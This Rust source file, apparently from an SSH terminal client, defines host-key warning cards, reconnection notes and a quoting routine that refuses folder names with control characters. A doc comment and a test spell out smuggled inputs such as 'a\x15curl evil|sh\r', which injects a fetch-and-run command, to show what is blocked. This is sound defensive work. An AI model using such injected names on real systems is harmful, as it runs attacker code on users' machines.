//! What a terminal says over its text about its session, without a screen: the question before
//! signing in to a server whose key isn't known yet (or changed), and the notes while the
//! connection comes and goes. A port of the cards in 0.10's `src/components/TerminalPane.tsx`
//! and the rules behind them in `src/lib/terminals.ts` and `src/lib/poll.ts`; the window's
//! side is `sshee-ui/src/screens/prompts.rs`.
//!
//! Also the one rule for typing a folder into a shell (`typed_cd`): "New terminal here" and an
//! agent started in a new terminal go to the folder by typing `cd`, and a folder whose name
//! holds a control character is refused, since a terminal acts on those as keys before any
//! quote is read.

/// A server key's fingerprint, as ssh-keygen prints it.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Fingerprint {
    /// "ED25519", "ECDSA", "RSA".
    pub kind: String,
    /// "SHA256:…"
    pub sha256: String,
}

/// The question asked before signing in to a server whose key isn't the one remembered.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum HostKey {
    /// First visit: the keys the server presented.
    New { fingerprints: Vec<Fingerprint> },
    /// The key differs from the one saved before.
    Changed { old: Vec<Fingerprint>, new: Vec<Fingerprint> },
}

impl HostKey {
    /// The card's title, for the server named `name` (already hidden in streamer mode).
    pub fn title(&self, name: &str) -> String {
        match self {
            HostKey::New { .. } => format!("New server. Is this really {name}?"),
            HostKey::Changed { .. } => format!("{name}'s key changed"),
        }
    }

    /// What the card says under its title.
    pub fn body(&self) -> &'static str {
        match self {
            HostKey::New { .. } => {
                "Compare the fingerprint below with the one your hosting provider shows. SSHeesh remembers it and warns you if it ever changes."
            }
            HostKey::Changed { .. } => {
                "This happens when a server is reinstalled, or its address now leads to another machine. It's also exactly what an attack looks like. If you didn't change anything on this server, don't connect."
            }
        }
    }

    /// The button that trusts the key, and the one that doesn't. The safe one is the default
    /// (Return) only when the key changed.
    pub fn answers(&self) -> (&'static str, &'static str) {
        match self {
            HostKey::New { .. } => ("Trust and connect", "Cancel"),
            HostKey::Changed { .. } => ("Connect anyway", "Don't connect"),
        }
    }

    /// The key changed: the card is the red one.
    pub fn changed(&self) -> bool {
        matches!(self, HostKey::Changed { .. })
    }
}

/// What a session that wasn't let in says when you said no to the server's key.
pub const NOT_CONFIRMED: &str = "Not connected. You didn't confirm this server's identity.";

/// A failure that is about the server's key: its card offers to review the change instead of
/// trying again (sshee-core's words, `session::fatal_reason`).
pub fn about_identity(message: &str) -> bool {
    message.contains("identity changed") || message.contains("identity couldn't be checked")
}

/// How long "Back online" stays after the connection comes back, in seconds (0.10's 3.2 s).
pub const BACK_ONLINE_FOR: f64 = 3.2;

/// How long connecting again goes on before "Reconnecting…" shows: a quick return doesn't
/// flash a card (0.10's 400 ms).
pub const REJOIN_DELAY: f64 = 0.4;

/// Whole seconds left of a wait of `wait_ms` that started `elapsed` seconds ago, rounded up.
pub fn seconds_left(wait_ms: u64, elapsed: f64) -> u64 {
    let left = wait_ms as f64 / 1000.0 - elapsed.max(0.0);
    if left <= 0.0 {
        0
    } else {
        left.ceil() as u64
    }
}

/// The line under a dropped connection's reason: "Reconnecting in 3s · attempt 2".
pub fn reconnecting_line(seconds_left: u64, attempt: u32) -> String {
    let mut line = if seconds_left > 0 { format!("Reconnecting in {seconds_left}s") } else { "Reconnecting…".to_owned() };
    if attempt > 1 {
        line.push_str(&format!(" · attempt {attempt}"));
    }
    line
}

/// The title of a terminal that let go of its connection while unused, after `minutes` from
/// Settings (0: it was asked to, some other way).
pub fn asleep_title(minutes: f64) -> String {
    if minutes <= 0.0 {
        "Disconnected while unused".to_owned()
    } else if minutes < 60.0 {
        format!("Disconnected after {} min unused", minutes.round())
    } else {
        "Disconnected after an hour unused".to_owned()
    }
}

/// The line under it.
pub const ASLEEP_LINE: &str = "Your shell keeps running on the server. Any key brings it back";

/// What "Back online" adds: the shell in tmux is where you left it, or this is a new one.
pub fn back_online_line(durable: bool) -> &'static str {
    if durable {
        "everything's where you left it"
    } else {
        "started a new shell"
    }
}

/// A session that stopped: the card's title, what it says, and its button. `failed`: the
/// reason it couldn't connect; `None`: the shell ended.
pub fn stopped(failed: Option<&str>) -> (&'static str, String, &'static str) {
    match failed {
        Some(message) if about_identity(message) => ("Couldn't connect", message.to_owned(), "Review the change"),
        Some(message) => ("Couldn't connect", message.to_owned(), "Try again"),
        None => ("Session ended", "The shell exited. Start a new one whenever you're ready.".to_owned(), "Start again"),
    }
}

/// Whether a terminal unused for `idle` seconds lets go of its connection now, with `minutes`
/// from Settings (0: never). Only one whose shell lives in tmux on a server, where it keeps
/// running: any other shell would end with the connection (0.10's `sleepsNow`).
pub fn sleeps_now(durable_on_server: bool, idle: f64, minutes: f64) -> bool {
    minutes > 0.0 && durable_on_server && idle >= minutes * 60.0
}

/// The shell a folder is typed into.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Shell {
    /// sh, bash, zsh, fish: `cd -- 'dir'`.
    Posix,
    /// Windows' PowerShell 5.1: no `&&`, and `-LiteralPath` keeps `[` `]` from acting as
    /// wildcards.
    PowerShell,
}

impl Shell {
    /// This computer's shell on `windows`, a server's anywhere.
    pub fn of(on_server: bool, windows: bool) -> Shell {
        if !on_server && windows {
            Shell::PowerShell
        } else {
            Shell::Posix
        }
    }
}

/// `s` quoted for typing into a terminal, or `None` when it holds a control character: a
/// terminal takes those as keys before the shell sees any quotes, so a folder named
/// "a<Ctrl+U>curl evil|sh<Enter>" would run that. The quoting holds in fish too: `'` and `\` go
/// outside the quotes, escaped. In PowerShell `‘’‚‛` close a string as `'` does, and each is
/// escaped by doubling it. (0.10's `typedQuote`.)
pub fn typed_quote(s: &str, shell: Shell) -> Option<String> {
    if s.chars().any(|c| matches!(c as u32, 0x00..=0x1f | 0x7f..=0x9f)) {
        return None;
    }
    if shell == Shell::PowerShell {
        let mut out = String::from("'");
        for c in s.chars() {
            out.push(c);
            if matches!(c, '\'' | '‘' | '’' | '‚' | '‛') {
                out.push(c);
            }
        }
        out.push('\'');
        return Some(out);
    }
    if s.is_empty() {
        return Some("''".to_owned());
    }
    let mut out = String::new();
    let mut run = String::new();
    let close = |run: &mut String, out: &mut String| {
        if !run.is_empty() {
            out.push('\'');
            out.push_str(run);
            out.push('\'');
            run.clear();
        }
    };
    for c in s.chars() {
        if c == '\'' || c == '\\' {
            close(&mut run, &mut out);
            out.push('\\');
            out.push(c);
        } else {
            run.push(c);
        }
    }
    close(&mut run, &mut out);
    Some(out)
}

/// Typed into `shell`: go into `dir`, then run `next` if that worked. `None` when `dir` can't
/// be typed (see [`typed_quote`]). (0.10's `typedCd`.)
pub fn typed_cd(dir: &str, shell: Shell, next: Option<&str>) -> Option<String> {
    let quoted = typed_quote(dir, shell)?;
    Some(match (shell, next) {
        (Shell::PowerShell, Some(next)) => format!("Set-Location -LiteralPath {quoted}; if ($?) {{ {next} }}"),
        (Shell::PowerShell, None) => format!("Set-Location -LiteralPath {quoted}"),
        (Shell::Posix, Some(next)) => format!("cd -- {quoted} && {next}"),
        (Shell::Posix, None) => format!("cd -- {quoted}"),
    })
}

/// What a terminal says when a folder can't be typed.
pub const UNTYPABLE_FOLDER: &str = "Can't open it in this folder: its name has control characters in it, which a terminal would take as keystrokes.";

/// What a pasted picture says in a server's terminal: there is no file to type, and the
/// picture isn't on the server.
pub const PICTURE_PASTE: &str = "A picture can't be pasted into a server's terminal. Drag its file in instead.";

/// The note while a clicked path is looked for on the server, past a moment.
pub fn looking_for(path: &str) -> String {
    format!("Looking for {}…", last_part(path))
}

/// The note when a clicked path isn't there: `relative` paths were looked for in the
/// terminal's folder and around it.
pub fn not_there(path: &str, relative: bool) -> String {
    if relative {
        format!("{} isn't in the terminal's folder, the folders your programs run in, or your home folder", last_part(path))
    } else {
        format!("This path no longer exists: {}", last_part(path))
    }
}

/// How long a click on a path waits before "Looking for…" shows, in seconds (0.10's 500 ms).
pub const LOOKING_AFTER: f64 = 0.5;

/// A file's lines picked out, as the editor's banner says them: "line 12", "lines 242–296".
pub fn lines_note(first: u32, last: u32) -> String {
    if last > first {
        format!("lines {first}–{last}")
    } else {
        format!("line {first}")
    }
}

fn last_part(path: &str) -> &str {
    let trimmed = path.trim_end_matches('/');
    trimmed.rsplit('/').next().filter(|s| !s.is_empty()).unwrap_or(path)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn fp(s: &str) -> Fingerprint {
        Fingerprint { kind: "ED25519".into(), sha256: s.into() }
    }

    #[test]
    fn the_key_question_says_which_kind_it_is() {
        let new = HostKey::New { fingerprints: vec![fp("SHA256:abc")] };
        assert_eq!(new.title("web-7731"), "New server. Is this really web-7731?");
        assert_eq!(new.answers(), ("Trust and connect", "Cancel"));
        assert!(!new.changed());
        let changed = HostKey::Changed { old: vec![fp("SHA256:old")], new: vec![fp("SHA256:new")] };
        assert_eq!(changed.title("web-7731"), "web-7731's key changed");
        assert_eq!(changed.answers(), ("Connect anyway", "Don't connect"));
        assert!(changed.changed() && changed.body().contains("attack"));
    }

    #[test]
    fn the_countdown_counts_whole_seconds_up() {
        assert_eq!(seconds_left(3000, 0.0), 3);
        assert_eq!(seconds_left(3000, 0.2), 3);
        assert_eq!(seconds_left(3000, 1.0), 2);
        assert_eq!(seconds_left(3000, 3.0), 0);
        assert_eq!(seconds_left(3000, 9.0), 0);
        assert_eq!(reconnecting_line(3, 1), "Reconnecting in 3s");
        assert_eq!(reconnecting_line(2, 4), "Reconnecting in 2s · attempt 4");
        assert_eq!(reconnecting_line(0, 2), "Reconnecting… · attempt 2");
    }

    #[test]
    fn notes_for_coming_and_going() {
        assert_eq!(asleep_title(20.0), "Disconnected after 20 min unused");
        assert_eq!(asleep_title(60.0), "Disconnected after an hour unused");
        assert_eq!(asleep_title(0.0), "Disconnected while unused");
        assert_eq!(back_online_line(true), "everything's where you left it");
        assert_eq!(back_online_line(false), "started a new shell");
        let (title, body, again) = stopped(Some("The server refused the connection"));
        assert_eq!((title, body.as_str(), again), ("Couldn't connect", "The server refused the connection", "Try again"));
        let (_, _, again) = stopped(Some("The server's identity changed since you last connected."));
        assert_eq!(again, "Review the change");
        assert_eq!(stopped(None).0, "Session ended");
    }

    #[test]
    fn only_a_shell_in_tmux_on_a_server_sleeps_and_only_past_its_time() {
        assert!(sleeps_now(true, 20.0 * 60.0, 20.0));
        assert!(!sleeps_now(true, 20.0 * 60.0 - 1.0, 20.0));
        assert!(!sleeps_now(false, 99_999.0, 20.0), "a shell that would end with the connection");
        assert!(!sleeps_now(true, 99_999.0, 0.0), "Off");
    }

    #[test]
    fn a_folder_is_typed_quoted_and_one_with_keys_in_its_name_is_refused() {
        assert_eq!(typed_cd("/srv/app", Shell::Posix, None).as_deref(), Some("cd -- '/srv/app'"));
        assert_eq!(typed_cd("/srv/it's", Shell::Posix, Some("claude")).as_deref(), Some(r"cd -- '/srv/it'\''s' && claude"));
        assert_eq!(typed_quote(r"a\b", Shell::Posix).as_deref(), Some(r"'a'\\'b'"));
        assert_eq!(typed_quote("", Shell::Posix).as_deref(), Some("''"));
        assert_eq!(typed_cd(r"C:\Users\Kim's", Shell::PowerShell, Some("codex")).as_deref(), Some(r"Set-Location -LiteralPath 'C:\Users\Kim''s'; if ($?) { codex }"));
        assert_eq!(typed_quote("a’b", Shell::PowerShell).as_deref(), Some("'a’’b'"));
        // A Ctrl+U, an Escape, a line break, C1's CSI: each would act as a key.
        for bad in ["a\x15curl evil|sh\r", "a\x1b[2J", "two\nlines", "a\u{9b}b"] {
            assert_eq!(typed_cd(bad, Shell::Posix, None), None, "{bad:?}");
            assert_eq!(typed_cd(bad, Shell::PowerShell, None), None, "{bad:?}");
        }
        assert_eq!(Shell::of(false, true), Shell::PowerShell);
        assert_eq!(Shell::of(true, true), Shell::Posix);
    }

    #[test]
    fn notes_about_a_clicked_path_name_its_last_part() {
        assert_eq!(looking_for("/var/log/app/today.log"), "Looking for today.log…");
        assert_eq!(not_there("/srv/gone.txt", false), "This path no longer exists: gone.txt");
        assert!(not_there("src/main.rs", true).starts_with("main.rs isn't in the terminal's folder"));
        assert_eq!(lines_note(242, 296), "lines 242–296");
        assert_eq!(lines_note(12, 12), "line 12");
    }

    #[test]
    fn a_failure_about_the_key_is_told_apart() {
        assert!(about_identity("The server's identity changed since you last connected."));
        assert!(about_identity("The server's identity couldn't be checked, so SSHeesh didn't connect."));
        assert!(!about_identity("The server refused the connection"));
    }
}
